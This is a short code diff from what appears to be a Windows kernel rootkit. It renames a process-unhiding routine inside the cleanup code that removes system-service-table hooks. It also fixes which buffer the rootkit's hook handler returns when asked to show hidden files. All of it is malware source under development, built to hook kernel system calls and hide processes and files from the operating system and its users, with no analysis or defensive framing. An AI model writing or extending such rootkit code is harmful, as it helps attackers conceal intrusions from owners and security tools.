@@ -108,9 +108,9 @@ BOOL roothook::CleanAllHooks() {
 	if (!NT_SUCCESS(roothook::SSDT::SystemServiceDTUnhook(NTQUERYEX_TAG))) {
 		return FALSE;
 	}
-	Status = process::UnhideProcess(0, 0);
+	Status = process::DKUnhideProcess(0, 0);
 	while (NT_SUCCESS(Status)) {
-		Status = process::UnhideProcess(0, 0);
+		Status = process::DKUnhideProcess(0, 0);
 	}
 	if (Status == STATUS_INVALID_PARAMETER) {
 		return TRUE;
@@ -418,7 +418,7 @@ NTSTATUS roothook::HookHandler(PVOID hookedf_params) {
 			RootkInstructions->Out = FileNameBuffer;
 		}
 		else if ((ULONG64)RootkInstructions->Reserved == SHOW_HIDDEN) {
-			RootkInstructions->Buffer = &HookHide;
+			RootkInstructions->Buffer = HookHide.HideBuffer;
 			RootkInstructions->Size = HookHide.BufferSize;
 		}
 		Return = HideFileObjectRK(RootkInstructions);
